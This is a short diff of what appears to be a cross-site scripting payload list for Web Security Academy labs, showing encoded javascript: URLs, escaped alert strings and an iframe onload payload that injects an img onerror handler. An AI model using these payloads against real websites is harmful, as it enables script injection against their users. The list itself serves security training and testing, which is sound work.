@@ -6,7 +6,7 @@
 <a href="javascript&#00000000000058;alert(1)">Click me</a>
 
 "\u0061lert(1)"
-
+"\x61lert"
 <a href="javascript\u{0000000003a}alert(1)">Click me</a>
 
 <iframe src="https://YOUR-LAB-ID.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
